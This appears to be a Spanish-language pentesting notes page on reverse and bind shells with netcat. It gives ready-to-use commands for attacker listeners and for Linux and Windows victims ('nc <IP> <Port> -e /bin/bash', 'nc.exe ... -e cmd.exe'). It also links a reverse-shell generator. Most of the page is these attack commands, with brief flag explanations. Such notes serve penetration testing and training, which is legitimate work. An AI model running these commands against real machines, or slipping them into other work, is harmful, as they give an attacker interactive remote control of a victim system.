# Shells

## Reverse Shell

<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption><p>Target to Attacker</p></figcaption></figure>

### Atacante Linux

{% code overflow="wrap" %}
```bash
nc -lvnp <Port>
```
{% endcode %}

Donde:

* `-l` : Modo escucha
* `-v` : Modo verbose (Retorna Información de la conexión, se puede usar -vvv para mas información en la conexión).&#x20;
* `-n` : Deshabilitar resolución inversa de DNS
* `-p <Port>` : Establece el puerto de escucha



### Victima Linux

```bash
nc <IP> <Port> -e /bin/bash
```

### Víctima Windows

```bash
nc.exe <IP> <Port> –e cmd.exe
```





## Bind Shell

En algunos proyectos donde no puedas establecer un servidor de escucha por que te encuentres por NAT o por Firewall, a veces es conveniente de que la máquina victima esté en modo escucha ofreciendo la shell, a esto se le llama <mark style="color:green;">**Bind shell**</mark> o <mark style="color:green;">**shell directa.**</mark>

<figure><img src="../../.gitbook/assets/image (26) (2).png" alt=""><figcaption></figcaption></figure>

### Atacante Linux

```bash
nc <IP Target> <Port>
```

### Víctima Linux

{% code overflow="wrap" %}
```bash
nc -lvnp <Port> -e /bin/bash
```
{% endcode %}

### Víctima Windows

{% code overflow="wrap" %}
```bash
nc.exe -l -p <Port> -e cmd.exe
```
{% endcode %}



## Referencias

Generador de Revershells

{% embed url="https://www.revshells.com/" %}

{% embed url="https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/" %}
